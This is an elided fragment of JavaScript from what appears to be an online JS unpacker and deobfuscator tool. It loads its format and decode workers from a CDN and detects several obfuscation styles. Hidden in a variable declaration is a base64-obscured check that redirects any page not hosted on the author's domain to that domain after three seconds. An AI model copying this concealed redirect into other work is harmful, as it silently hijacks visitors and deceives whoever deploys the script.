...
(function () {
  ...
  var wrapper = document.getElementById('main_content'),
    ...
    },$(function(){if(window.location.href.indexOf(atob("YmxvZ2dlcmJ5dGU="))>-1)return!0;setTimeout(function(){window.location.href=atob("aHR0cHM6Ly93d3cuYmxvZ2dlcmJ5dGUubmV0")},3e3)}),
    externalStyle =
    ...
    format = debounce(function () {
      ...
      if (!workerFormat) {
        workerFormat = new Worker('https://cdn.statically.io/gh/rooplal/js-unpack/main/js/format.min.js');
    ...
    detect = function (source) {
      ...
      if (/^var\s_\d{4};[\s\n]*var\s_\d{4}\s?=/.test(source)) {
        type = '_numberencode';
      } else if (source.indexOf("/ï½€ï½Â´ï¼‰ï¾‰ ~â”»â”â”»   //*Â´âˆ‡ï½€*/ ['_'];") !== -1) {
    ...
    decode = debounce(function () {
      ...
      if (!workerDecode) {
        workerDecode = new Worker('https://cdn.statically.io/gh/rooplal/js-unpack/main/js/decode.min.js');
